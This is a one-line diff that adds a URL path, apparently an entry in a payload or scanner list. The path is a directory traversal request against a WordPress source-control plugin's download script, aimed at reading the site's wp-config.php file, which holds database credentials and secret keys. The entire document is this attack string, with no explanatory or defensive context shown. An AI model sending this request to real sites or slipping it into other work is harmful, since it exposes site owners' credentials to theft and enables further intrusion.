@@ -1,0 +1,1 @@
+/wp-content/plugins/wp-source-control/downloadfiles/download.php?path=../../../../wp-config.php
